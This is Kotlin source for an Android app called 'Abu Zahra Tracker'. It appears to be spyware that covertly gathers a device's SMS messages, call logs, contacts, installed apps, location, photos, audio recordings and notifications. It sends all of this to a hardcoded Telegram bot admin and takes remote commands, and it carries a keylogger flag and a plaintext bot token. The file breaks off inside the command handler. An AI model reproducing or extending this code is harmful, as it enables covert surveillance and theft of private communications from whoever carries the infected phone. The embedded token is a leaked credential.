package com.abuzahra.tracker

import android.content.Context
import android.content.pm.PackageManager
import android.net.wifi.WifiManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.util.Log
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import kotlinx.coroutines.*
import java.io.BufferedReader
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.InputStreamReader
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.security.cert.X509Certificate
import java.text.SimpleDateFormat
import java.util.*
import javax.net.ssl.HostnameVerifier
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager

/**
 * TelegramDirectClient - التواصل المباشر مع تيليجرام بدون سيرفر وسيط
 *
 * المعماريات الجديدة:
 * التطبيق ←→ تيليجرام (مباشر)
 *
 * - التطبيق يستقبل الأوامر من المدير عبر getUpdates (long polling)
 * - التطبيق يرسل البيانات المجمعة مباشرة للمدير عبر sendMessage / sendDocument / sendPhoto / sendAudio / sendLocation
 * - لا حاجة لأي سيرفر وسيط
 *
 * البوت توكن: 8898830696:AAGpgjtwn2cB5wcKQ07PJPXjhKF0Ll43wrs
 * المدير ID: 7344776596
 */
object TelegramDirectClient {

    private const val TAG = "TelegramDirectClient"
    const val BOT_TOKEN = "8898830696:AAGpgjtwn2cB5wcKQ07PJPXjhKF0Ll43wrs"
    const val ADMIN_CHAT_ID = 7344776596L
    private const val TELEGRAM_API = "https://api.telegram.org/bot$BOT_TOKEN"
    private const val CONNECT_TIMEOUT = 20000
    private const val READ_TIMEOUT = 60000
    private const val POLL_TIMEOUT = 30 // ثوانٍ للـ long polling
    private const val PREFS_NAME = "child_prefs"
    private const val KEY_LAST_UPDATE_ID = "last_telegram_update_id"
    private const val KEY_START_TIME = "telegram_start_time"
    private const val KEY_AUTO_LOCATION_INTERVAL = "auto_location_interval"
    private const val KEY_KEYLOGGER_ACTIVE = "keylogger_active"

    private val gson = Gson()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var lastUpdateId: Long = 0
    @Volatile
    private var isPolling = false
    private var pollingJob: Job? = null
    private var appStartTime: Long = 0
    private var autoLocationJob: Job? = null
    private var isAutoLocationRunning = false
    private var isKeyloggerRunning = false

    // ==================== ==================== ====================
    //              كلاسات البيانات
    // ==================== ==================== ====================

    data class TelegramCommand(
        val command: String = "",
        val updateId: Long = 0,
        val params: Map<String, String>? = null
    )

    // ==================== ==================== ====================
    //              إدارة الجلسة (Session Persistence)
    // ==================== ==================== ====================

    /**
     * حفظ آخر update_id في SharedPreferences
     */
    private fun saveLastUpdateId(context: Context, updateId: Long) {
        try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            prefs.edit().putLong(KEY_LAST_UPDATE_ID, updateId).apply()
            Log.d(TAG, "تم حفظ lastUpdateId: $updateId")
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في حفظ lastUpdateId: ${e.message}")
        }
    }

    /**
     * استعادة آخر update_id من SharedPreferences
     */
    private fun loadLastUpdateId(context: Context): Long {
        return try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val saved = prefs.getLong(KEY_LAST_UPDATE_ID, 0)
            Log.d(TAG, "تم استعادة lastUpdateId: $saved")
            saved
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في استعادة lastUpdateId: ${e.message}")
            0
        }
    }

    /**
     * حفظ وقت بدء التطبيق
     */
    private fun saveStartTime(context: Context) {
        try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            prefs.edit().putLong(KEY_START_TIME, System.currentTimeMillis()).apply()
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في حفظ وقت البدء: ${e.message}")
        }
    }

    /**
     * الحصول على وقت البدء
     */
    private fun getStartTime(context: Context): Long {
        return try {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            prefs.getLong(KEY_START_TIME, System.currentTimeMillis())
        } catch (e: Exception) {
            System.currentTimeMillis()
        }
    }

    // ==================== ==================== ====================
    //              دوال الإرسال (Sending Functions)
    // ==================== ==================== ====================

    /**
     * إرسال رسالة نصية مباشرة للمدير على تيليجرام
     */
    suspend fun sendMessage(text: String, parseMode: String? = null, disablePreview: Boolean = false): Boolean {
        return try {
            val payload = mutableMapOf<String, Any>(
                "chat_id" to ADMIN_CHAT_ID,
                "text" to text
            )
            if (parseMode != null) payload["parse_mode"] = parseMode
            if (disablePreview) payload["disable_web_page_preview"] = true

            val responseJson = httpPost("sendMessage", gson.toJson(payload))
            val success = responseJson != null && gson.fromJson(responseJson, Map::class.java)["ok"] == true
            if (success) {
                Log.d(TAG, "تم إرسال رسالة نصية بنجاح (${text.length} حرف)")
            } else {
                Log.e(TAG, "فشل إرسال رسالة نصية")
            }
            success
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendMessage: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال رسالة طويلة مقسمة إذا لزم الأمر
     */
    suspend fun sendLongMessage(text: String, parseMode: String? = "HTML"): Boolean {
        return try {
            val maxLen = 4096
            if (text.length <= maxLen) {
                sendMessage(text, parseMode)
            } else {
                val chunks = text.chunked(maxLen)
                var allSuccess = true
                for ((index, chunk) in chunks.withIndex()) {
                    val success = if (index == chunks.size - 1) {
                        sendMessage(chunk, parseMode)
                    } else {
                        sendMessage("$chunk\n<i>... تكملة ...</i>", parseMode)
                    }
                    if (!success) allSuccess = false
                    delay(500) // تجنب throttle من تيليجرام
                }
                allSuccess
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendLongMessage: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال ملف حقيقي عبر multipart/form-data
     * الملف يُرسل كملف مرفق قابل للتحميل
     */
    suspend fun sendDocumentFile(
        fileBytes: ByteArray,
        fileName: String,
        caption: String? = null
    ): Boolean {
        return try {
            val boundary = "------TelegramBoundary${System.currentTimeMillis()}"
            val lineEnd = "\r\n"
            val twoHyphens = "--"

            val url = URL("$TELEGRAM_API/sendDocument")
            val connection = setupConnection(url) as? HttpURLConnection ?: return false
            connection.requestMethod = "POST"
            connection.setRequestProperty(
                "Content-Type",
                "multipart/form-data; boundary=$boundary"
            )
            connection.doOutput = true
            connection.setChunkedStreamingMode(fileBytes.size.coerceAtLeast(8192))

            val outputStream = connection.outputStream
            val writer = OutputStreamWriter(outputStream, "UTF-8")

            // بناء رابط المتغيرات (chat_id و caption)
            val builder = StringBuilder()
            builder.append(twoHyphens).append(boundary).append(lineEnd)
            builder.append("Content-Disposition: form-data; name=\"chat_id\"").append(lineEnd)
            builder.append(lineEnd)
            builder.append(ADMIN_CHAT_ID).append(lineEnd)

            if (caption != null) {
                builder.append(twoHyphens).append(boundary).append(lineEnd)
                builder.append("Content-Disposition: form-data; name=\"caption\"").append(lineEnd)
                builder.append(lineEnd)
                builder.append(caption).append(lineEnd)
            }

            // بناء جزء الملف
            builder.append(twoHyphens).append(boundary).append(lineEnd)
            builder.append(
                "Content-Disposition: form-data; name=\"document\"; filename=\"$fileName\""
            ).append(lineEnd)
            builder.append("Content-Type: application/octet-stream").append(lineEnd)
            builder.append(lineEnd)

            writer.write(builder.toString())
            writer.flush()

            // كتابة بيانات الملف
            outputStream.write(fileBytes)
            outputStream.flush()

            // إنهاء الـ multipart
            writer.write(lineEnd)
            writer.write("$twoHyphens$boundary$twoHyphens$lineEnd")
            writer.flush()
            writer.close()
            outputStream.close()

            val responseCode = connection.responseCode
            val responseBody = readResponse(connection)

            if (responseCode in 200..299) {
                Log.d(TAG, "تم إرسال ملف بنجاح: $fileName (${fileBytes.size} بايت)")
                true
            } else {
                Log.e(TAG, "فشل إرسال الملف: $responseCode - $responseBody")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendDocumentFile: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال ملف PDF/JSON مباشرة للمدير على تيليجرام (نسخة متوافقة)
     */
    suspend fun sendDocumentContent(fileContent: String, fileName: String, caption: String? = null): Boolean {
        return sendDocumentFile(
            fileContent.toByteArray(Charsets.UTF_8),
            fileName,
            caption
        )
    }

    /**
     * إرسال ملف من مسار مباشرة
     */
    suspend fun sendDocument(filePath: String, fileName: String? = null, caption: String? = null): Boolean {
        return try {
            val file = java.io.File(filePath)
            if (!file.exists()) {
                Log.e(TAG, "الملف غير موجود: $filePath")
                return false
            }
            sendDocumentFile(file.readBytes(), fileName ?: file.name, caption)
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendDocument(path): ${e.message}", e)
            false
        }
    }

    /**
     * إرسال صورة من مسار ملف
     */
    suspend fun sendPhoto(filePath: String, caption: String? = null): Boolean {
        return try {
            val file = java.io.File(filePath)
            if (!file.exists()) {
                Log.e(TAG, "الملف غير موجود: $filePath")
                return false
            }
            sendPhoto(file.readBytes(), caption)
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendPhoto(path): ${e.message}", e)
            false
        }
    }

    /**
     * إرسال تسجيل صوتي من مسار ملف
     */
    suspend fun sendAudio(filePath: String, caption: String? = null): Boolean {
        return try {
            val file = java.io.File(filePath)
            if (!file.exists()) {
                Log.e(TAG, "الملف غير موجود: $filePath")
                return false
            }
            sendAudio(file.readBytes(), caption)
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendAudio(path): ${e.message}", e)
            false
        }
    }

    /**
     * إرسال صورة عبر multipart/form-data
     */
    suspend fun sendPhoto(
        photoBytes: ByteArray,
        caption: String? = null
    ): Boolean {
        return try {
            val boundary = "------TelegramBoundary${System.currentTimeMillis()}"
            val lineEnd = "\r\n"
            val twoHyphens = "--"

            val url = URL("$TELEGRAM_API/sendPhoto")
            val connection = setupConnection(url) as? HttpURLConnection ?: return false
            connection.requestMethod = "POST"
            connection.setRequestProperty(
                "Content-Type",
                "multipart/form-data; boundary=$boundary"
            )
            connection.doOutput = true
            connection.setChunkedStreamingMode(photoBytes.size.coerceAtLeast(8192))

            val outputStream = connection.outputStream
            val writer = OutputStreamWriter(outputStream, "UTF-8")

            val builder = StringBuilder()
            builder.append(twoHyphens).append(boundary).append(lineEnd)
            builder.append("Content-Disposition: form-data; name=\"chat_id\"").append(lineEnd)
            builder.append(lineEnd)
            builder.append(ADMIN_CHAT_ID).append(lineEnd)

            if (caption != null) {
                builder.append(twoHyphens).append(boundary).append(lineEnd)
                builder.append("Content-Disposition: form-data; name=\"caption\"").append(lineEnd)
                builder.append(lineEnd)
                builder.append(caption).append(lineEnd)
            }

            builder.append(twoHyphens).append(boundary).append(lineEnd)
            builder.append(
                "Content-Disposition: form-data; name=\"photo\"; filename=\"photo_${System.currentTimeMillis()}.jpg\""
            ).append(lineEnd)
            builder.append("Content-Type: image/jpeg").append(lineEnd)
            builder.append(lineEnd)

            writer.write(builder.toString())
            writer.flush()

            outputStream.write(photoBytes)
            outputStream.flush()

            writer.write(lineEnd)
            writer.write("$twoHyphens$boundary$twoHyphens$lineEnd")
            writer.flush()
            writer.close()
            outputStream.close()

            val responseCode = connection.responseCode
            val responseBody = readResponse(connection)

            if (responseCode in 200..299) {
                Log.d(TAG, "تم إرسال صورة بنجاح (${photoBytes.size} بايت)")
                true
            } else {
                Log.e(TAG, "فشل إرسال الصورة: $responseCode - $responseBody")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendPhoto: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال تسجيل صوتي عبر multipart/form-data
     */
    suspend fun sendAudio(
        audioBytes: ByteArray,
        caption: String? = null
    ): Boolean {
        return try {
            val boundary = "------TelegramBoundary${System.currentTimeMillis()}"
            val lineEnd = "\r\n"
            val twoHyphens = "--"

            val url = URL("$TELEGRAM_API/sendAudio")
            val connection = setupConnection(url) as? HttpURLConnection ?: return false
            connection.requestMethod = "POST"
            connection.setRequestProperty(
                "Content-Type",
                "multipart/form-data; boundary=$boundary"
            )
            connection.doOutput = true
            connection.setChunkedStreamingMode(audioBytes.size.coerceAtLeast(8192))

            val outputStream = connection.outputStream
            val writer = OutputStreamWriter(outputStream, "UTF-8")

            val builder = StringBuilder()
            builder.append(twoHyphens).append(boundary).append(lineEnd)
            builder.append("Content-Disposition: form-data; name=\"chat_id\"").append(lineEnd)
            builder.append(lineEnd)
            builder.append(ADMIN_CHAT_ID).append(lineEnd)

            if (caption != null) {
                builder.append(twoHyphens).append(boundary).append(lineEnd)
                builder.append("Content-Disposition: form-data; name=\"caption\"").append(lineEnd)
                builder.append(lineEnd)
                builder.append(caption).append(lineEnd)
            }

            builder.append(twoHyphens).append(boundary).append(lineEnd)
            builder.append(
                "Content-Disposition: form-data; name=\"audio\"; filename=\"audio_${System.currentTimeMillis()}.ogg\""
            ).append(lineEnd)
            builder.append("Content-Type: audio/ogg").append(lineEnd)
            builder.append(lineEnd)

            writer.write(builder.toString())
            writer.flush()

            outputStream.write(audioBytes)
            outputStream.flush()

            writer.write(lineEnd)
            writer.write("$twoHyphens$boundary$twoHyphens$lineEnd")
            writer.flush()
            writer.close()
            outputStream.close()

            val responseCode = connection.responseCode
            val responseBody = readResponse(connection)

            if (responseCode in 200..299) {
                Log.d(TAG, "تم إرسال تسجيل صوتي بنجاح (${audioBytes.size} بايت)")
                true
            } else {
                Log.e(TAG, "فشل إرسال التسجيل الصوتي: $responseCode - $responseBody")
                false
            }
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendAudio: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال موقع جغرافي مباشرة للمدير على تيليجرام
     */
    suspend fun sendLocation(latitude: Double, longitude: Double, accuracy: Float? = null): Boolean {
        return try {
            val payload = mutableMapOf<String, Any>(
                "chat_id" to ADMIN_CHAT_ID,
                "latitude" to latitude,
                "longitude" to longitude
            )
            accuracy?.let { payload["horizontal_accuracy"] = it }

            val responseJson = httpPost("sendLocation", gson.toJson(payload))
            val success = responseJson != null && gson.fromJson(responseJson, Map::class.java)["ok"] == true
            if (success) {
                Log.d(TAG, "تم إرسال الموقع: $latitude, $longitude")
            } else {
                Log.e(TAG, "فشل إرسال الموقع")
            }
            success
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendLocation: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال لوحة مفاتيح (Reply Keyboard) للمدير
     */
    suspend fun sendKeyboard(
        text: String,
        buttons: List<List<String>>,
        resize: Boolean = true,
        oneTime: Boolean = false
    ): Boolean {
        return try {
            val keyboard = mapOf(
                "keyboard" to buttons,
                "resize_keyboard" to resize,
                "one_time_keyboard" to oneTime
            )
            val payload = mapOf(
                "chat_id" to ADMIN_CHAT_ID,
                "text" to text,
                "reply_markup" to keyboard
            )

            val responseJson = httpPost("sendMessage", gson.toJson(payload))
            responseJson != null && gson.fromJson(responseJson, Map::class.java)["ok"] == true
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendKeyboard: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال لوحة مفاتيح إنلاين (Inline Keyboard) للمدير
     */
    suspend fun sendInlineKeyboard(
        text: String,
        buttons: List<List<Map<String, String>>>
    ): Boolean {
        return try {
            val inlineKeyboard = mapOf("inline_keyboard" to buttons)
            val payload = mapOf(
                "chat_id" to ADMIN_CHAT_ID,
                "text" to text,
                "reply_markup" to inlineKeyboard,
                "parse_mode" to "HTML"
            )

            val responseJson = httpPost("sendMessage", gson.toJson(payload))
            responseJson != null && gson.fromJson(responseJson, Map::class.java)["ok"] == true
        } catch (e: Exception) {
            Log.e(TAG, "خطأ في sendInlineKeyboard: ${e.message}", e)
            false
        }
    }

    /**
     * إرسال إشعار بأنه يتم جمع البيانات
     */
    suspend fun sendProcessingNotice(command: String): Boolean {
        return sendMessage(
            "⚡ جاري جمع بيانات <b>$command</b>...\nالرجاء الانتظار...",
            "HTML"
        )
    }

    // ==================== ==================== ====================
    //          تنسيق البيانات كملفات (File Formatting)
    // ==================== ==================== ====================

    /**
     * الحصول على التاريخ والوقت الحاليين بتنسيق جميل
     */
    private fun getCurrentDateTime(): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        return sdf.format(Date())
    }

    /**
     * تنسيق الرسائل النصية كملف نصي
     */
    private fun formatSmsAsFile(context: Context, data: Any): String {
        val sb = StringBuilder()
        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine("  📱 أبو زهرة - تقرير الرسائل النصية")
        sb.appendLine("  📅 التاريخ: ${getCurrentDateTime()}")
        sb.appendLine("  📱 الجهاز: ${Build.MODEL} ${Build.BRAND}")
        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine()

        if (data is List<*>) {
            sb.appendLine("📊 إجمالي الرسائل: ${data.size}")
            sb.appendLine()
            data.forEachIndexed { index, item ->
                if (item is Map<*, *>) {
                    sb.appendLine("━━━ الرسالة #${index + 1} ━━━")
                    sb.appendLine("📱 الرقم: ${item["phone"] ?: "غير معروف"}")
                    sb.appendLine("📝 النص: ${item["body"] ?: "فارغ"}")
                    sb.appendLine("📅 التاريخ: ${item["date_readable"] ?: "غير معروف"}")
                    sb.appendLine("📂 النوع: ${item["type"] ?: "غير معروف"}")
                    val isRead = item["is_read"]
                    sb.appendLine("✅ مقروءة: ${if (isRead == true) "نعم" else "لا"}")
                    sb.appendLine()
                }
            }
        } else {
            sb.appendLine("لا توجد بيانات متاحة")
        }

        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine("  📱 أبو زهرة - تقرير الرسائل النصية")
        sb.appendLine("  🏷️ تم التوليد تلقائياً بواسطة البوت")
        sb.appendLine("═══════════════════════════════════════")
        return sb.toString()
    }

    /**
     * تنسيق سجل المكالمات كملف نصي
     */
    private fun formatCallsAsFile(context: Context, data: Any): String {
        val sb = StringBuilder()
        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine("  📞 أبو زهرة - تقرير سجل المكالمات")
        sb.appendLine("  📅 التاريخ: ${getCurrentDateTime()}")
        sb.appendLine("  📱 الجهاز: ${Build.MODEL} ${Build.BRAND}")
        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine()

        if (data is List<*>) {
            sb.appendLine("📊 إجمالي المكالمات: ${data.size}")
            sb.appendLine()
            data.forEachIndexed { index, item ->
                if (item is Map<*, *>) {
                    sb.appendLine("━━━ المكالمة #${index + 1} ━━━")
                    sb.appendLine("📞 الرقم: ${item["phone"] ?: "غير معروف"}")
                    val name = item["name"] as? String
                    if (!name.isNullOrBlank()) {
                        sb.appendLine("👤 الاسم: $name")
                    }
                    sb.appendLine("📂 النوع: ${item["type"] ?: "غير معروف"}")
                    sb.appendLine("⏱️ المدة: ${item["duration_formatted"] ?: "غير معروف"}")
                    sb.appendLine("📅 التاريخ: ${item["date_readable"] ?: "غير معروف"}")
                    sb.appendLine()
                }
            }
        } else {
            sb.appendLine("لا توجد بيانات متاحة")
        }

        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine("  📞 أبو زهرة - تقرير سجل المكالمات")
        sb.appendLine("  🏷️ تم التوليد تلقائياً بواسطة البوت")
        sb.appendLine("═══════════════════════════════════════")
        return sb.toString()
    }

    /**
     * تنسيق جهات الاتصال كملف نصي
     */
    private fun formatContactsAsFile(context: Context, data: Any): String {
        val sb = StringBuilder()
        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine("  📇 أبو زهرة - تقرير جهات الاتصال")
        sb.appendLine("  📅 التاريخ: ${getCurrentDateTime()}")
        sb.appendLine("  📱 الجهاز: ${Build.MODEL} ${Build.BRAND}")
        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine()

        if (data is List<*>) {
            sb.appendLine("📊 إجمالي جهات الاتصال: ${data.size}")
            sb.appendLine()
            data.forEachIndexed { index, item ->
                if (item is Map<*, *>) {
                    sb.appendLine("━━━ جهة الاتصال #${index + 1} ━━━")
                    sb.appendLine("👤 الاسم: ${item["name"] ?: "غير معروف"}")
                    val phones = item["phones"]
                    if (phones is List<*>) {
                        phones.forEach { phone ->
                            if (phone != null) sb.appendLine("📱 الرقم: $phone")
                        }
                    }
                    val emails = item["emails"]
                    if (emails is List<*> && emails.isNotEmpty()) {
                        emails.forEach { email ->
                            if (email != null) sb.appendLine("📧 البريد: $email")
                        }
                    }
                    sb.appendLine()
                }
            }
        } else {
            sb.appendLine("لا توجد بيانات متاحة")
        }

        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine("  📇 أبو زهرة - تقرير جهات الاتصال")
        sb.appendLine("  🏷️ تم التوليد تلقائياً بواسطة البوت")
        sb.appendLine("═══════════════════════════════════════")
        return sb.toString()
    }

    /**
     * تنسيق التطبيقات كملف نصي
     */
    private fun formatAppsAsFile(context: Context, data: Any): String {
        val sb = StringBuilder()
        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine("  📦 أبو زهرة - تقرير التطبيقات المثبتة")
        sb.appendLine("  📅 التاريخ: ${getCurrentDateTime()}")
        sb.appendLine("  📱 الجهاز: ${Build.MODEL} ${Build.BRAND}")
        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine()

        if (data is List<*>) {
            sb.appendLine("📊 إجمالي التطبيقات: ${data.size}")
            sb.appendLine()
            data.forEachIndexed { index, item ->
                if (item is Map<*, *>) {
                    sb.appendLine("━━━ التطبيق #${index + 1} ━━━")
                    sb.appendLine("📦 الاسم: ${item["name"] ?: "غير معروف"}")
                    sb.appendLine("🏷️ الحزمة: ${item["package"] ?: "غير معروف"}")
                    sb.appendLine("📌 الإصدار: ${item["version"] ?: "غير معروف"}")
                    sb.appendLine("⚙️ نظامي: ${if (item["is_system"] == true) "نعم" else "لا"}")
                    sb.appendLine()
                }
            }
        } else {
            sb.appendLine("لا توجد بيانات متاحة")
        }

        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine("  📦 أبو زهرة - تقرير التطبيقات المثبتة")
        sb.appendLine("  🏷️ تم التوليد تلقائياً بواسطة البوت")
        sb.appendLine("═══════════════════════════════════════")
        return sb.toString()
    }

    /**
     * تنسيق بيانات عامة كملف نصي
     */
    private fun formatGenericDataAsFile(context: Context, title: String, data: Any): String {
        val sb = StringBuilder()
        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine("  📱 أبو زهرة - $title")
        sb.appendLine("  📅 التاريخ: ${getCurrentDateTime()}")
        sb.appendLine("  📱 الجهاز: ${Build.MODEL} ${Build.BRAND}")
        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine()

        when (data) {
            is List<*> -> {
                sb.appendLine("📊 عدد العناصر: ${data.size}")
                sb.appendLine()
                data.forEachIndexed { index, item ->
                    sb.appendLine("━━━ العنصر #${index + 1} ━━━")
                    if (item is Map<*, *>) {
                        item.forEach { (key, value) ->
                            sb.appendLine("  • $key: $value")
                        }
                    } else {
                        sb.appendLine("  • $item")
                    }
                    sb.appendLine()
                }
            }
            is Map<*, *> -> {
                data.forEach { (key, value) ->
                    sb.appendLine("• $key: $value")
                }
            }
            else -> {
                sb.appendLine(data.toString())
            }
        }

        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine("  📱 أبو زهرة - $title")
        sb.appendLine("  🏷️ تم التوليد تلقائياً بواسطة البوت")
        sb.appendLine("═══════════════════════════════════════")
        return sb.toString()
    }

    /**
     * تنسيق تقرير "كل البيانات" كملف نصي
     */
    private fun formatAllDataAsFile(context: Context, allData: Map<String, Any>): String {
        val sb = StringBuilder()
        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine("  📱 أبو زهرة - تقرير شامل لجميع البيانات")
        sb.appendLine("  📅 التاريخ: ${getCurrentDateTime()}")
        sb.appendLine("  📱 الجهاز: ${Build.MODEL} ${Build.BRAND}")
        sb.appendLine("  🤖 أندرويد: ${Build.VERSION.RELEASE}")
        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine()

        val sections = listOf(
            "info" to "ℹ️ معلومات الجهاز",
            "battery" to "🔋 حالة البطارية",
            "location" to "📍 الموقع الجغرافي",
            "sms" to "📱 الرسائل النصية",
            "calls" to "📞 سجل المكالمات",
            "contacts" to "📇 جهات الاتصال",
            "apps" to "📦 التطبيقات المثبتة",
            "notifications" to "🔔 الإشعارات"
        )

        for ((key, label) in sections) {
            val sectionData = allData[key]
            if (sectionData != null) {
                sb.appendLine("╔══════════════════════════════╗")
                sb.appendLine("║  $label")
                sb.appendLine("╚══════════════════════════════╝")
                sb.appendLine()

                when (sectionData) {
                    is List<*> -> {
                        sb.appendLine("عدد العناصر: ${sectionData.size}")
                        sectionData.take(20).forEachIndexed { index, item ->
                            sb.appendLine("  #${index + 1}: $item")
                        }
                        if (sectionData.size > 20) {
                            sb.appendLine("  ... و ${sectionData.size - 20} عنصر آخر")
                        }
                    }
                    is Map<*, *> -> {
                        sectionData.forEach { (k, v) ->
                            sb.appendLine("  • $k: $v")
                        }
                    }
                    else -> {
                        sb.appendLine("  $sectionData")
                    }
                }
                sb.appendLine()
            }
        }

        sb.appendLine("═══════════════════════════════════════")
        sb.appendLine("  📱 أبو زهرة - تقرير شامل")
        sb.appendLine("  🏷️ تم التوليد تلقائياً بواسطة البوت")
        sb.appendLine("  📊 عدد الأقسام: ${allData.size}")
        sb.appendLine("═══════════════════════════════════════")
        return sb.toString()
    }

    // ==================== ==================== ====================
    //          استقبال الأوامر من السيرفر (Server Polling)
    //          لا نستخدم getUpdates - السيرفر هو المسؤول عن تلقي الأوامر من المدير
    //          التطبيق يتحقق فقط من السيرفر للحصول على الأوامر المعلقة
    // ==================== ==================== ====================

    /**
     * إرسال إشعار بدء التشغيل للمدير (بدون getUpdates)
     */
    fun sendStartupNotification(context: Context) {
        scope.launch {
            try {
                val deviceInfo = getDeviceInfoShort(context)
                sendMessage(
                    "✅ <b>الجهاز متصل الآن</b>\n\n$deviceInfo",
                    "HTML"
                )
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في إرسال إشعار البدء: ${e.message}")
            }
        }
    }

    // تم إيقاف startCommandPolling - السيرفر هو المسؤول عن getUpdates
    // لا يمكن لتطبيقين استخدام getUpdates بنفس التوكن في نفس الوقت

    /**
     * @deprecated لا تستخدم - تم إيقاف getUpdates من التطبيق
     * السيرفر يستلم الأوامر ويضعها في الطابور، والتطبيق يتحقق من السيرفر
     */
    @Deprecated("Use server polling instead")
    fun startCommandPolling(context: Context) {
        Log.w(TAG, "تم إيقاف getUpdates من التطبيق - السيرفر يتولى استقبال الأوامر")
        sendStartupNotification(context)
    }

    fun stopCommandPolling() {
        // لا حاجة لإيقاف شيء - getUpdates غير مفعّل
        Log.d(TAG, "getUpdates غير مفعّل في التطبيق")
    }

    /**
     * @deprecated لا تستخدم - تم إيقاف getUpdates من التطبيق
     */
    @Deprecated("Use server polling instead")
    private suspend fun getPendingCommands(context: Context): List<TelegramCommand> {
        Log.w(TAG, "getUpdates معطّل - التطبيق يجب أن يستخدم السيرفر للأوامر")
        return emptyList()
    }

    /**
     * معالجة الأوامر المستلمة من السيرفر - مجموعة الأوامر الموسعة
     */
    private suspend fun processCommands(context: Context, commands: List<TelegramCommand>) {
        for (command in commands) {
            try {
                processSingleCommand(context, command.command)
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في معالجة الأمر [${command.command}]: ${e.message}", e)
                sendMessage("⚠️ خطأ في تنفيذ الأمر: ${e.message}", "HTML")
            }
        }
    }

    /**
     * معالجة أمر واحد
     */
    private suspend fun processSingleCommand(context: Context, command: String) {
        when (command) {

            // ==================== أوامر العرض والقوائم ====================
            "start", "menu", "help", "قائمة" -> sendMainKeyboard()
            "test" -> {
                sendMessage("✅ <b>اختبار ناجح!</b>\n\nالجهاز متصل بالإنترنت والبوت يعمل بشكل طبيعي.\n📊 التاريخ: ${getCurrentDateTime()}", "HTML")
            }
            "version" -> {
                sendMessage("📱 <b>معلومات الإصدار</b>\n\n" +
                        "🏷️ الإصدار: 2.0.0\n" +
                        "🤖 أندرويد: ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n" +
                        "📦 التطبيق: أبو زهرة تريكر\n" +
                        "📡 الوضع: اتصال مباشر بتيليجرام\n" +
                        "⏱️ وقت البدء: ${formatDate(getStartTime(context))}", "HTML")
            }
            "uptime" -> {
                val startTime = getStartTime(context)
                val uptimeMs = System.currentTimeMillis() - startTime
                val uptimeSecs = uptimeMs / 1000
                val hours = uptimeSecs / 3600
                val minutes = (uptimeSecs % 3600) / 60
                val seconds = uptimeSecs % 60
                sendMessage("⏱️ <b>وقت التشغيل</b>\n\n" +
                        "🕐 المدة: $hours ساعة، $minutes دقيقة، $seconds ثانية\n" +
                        "📅 بدء العمل: ${formatDate(startTime)}\n" +
                        "📡 الاستطلاع: ${if (isPolling) "✅ نشط" else "❌ متوقف"}", "HTML")
            }
            "ping" -> {
                sendMessage("🏓 <b>بونغ!</b>\n\n✅ الجهاز متصل وعامل\n" +
                        "📊 التأخير: < 1 ثانية\n" +
                        "🕐 الوقت: ${getCurrentDateTime()}", "HTML")
            }
            "permissions" -> sendPermissionsStatus(context)
            "check_permissions" -> sendPermissionsStatus(context)

            // ==================== أوامر معلومات الجهاز ====================
            "info", "معلومات" -> executeAndSendAsFile(context, "info", "📱 معلومات الجهاز", "info")
            "battery", "بطارية" -> executeAndSendAsFile(context, "battery", "🔋 حالة البطارية", "battery")
            "status", "حالة" -> sendDeviceStatus(context)
            "storage", "تخزين" -> sendStorageStatus(context)
            "sim" -> sendSimInfo(context)
            "network" -> sendNetworkInfo(context)
            "wifi" -> sendWifiInfo(context)
            "bluetooth" -> sendBluetoothInfo(context)
            "screen" -> sendScreenInfo(context)
            "ram" -> sendRamInfo(context)
            "cpu" -> sendCpuInfo(context)
            "storage_detail" -> sendStorageDetail(context)
            "ip" -> sendIpInfo(context)
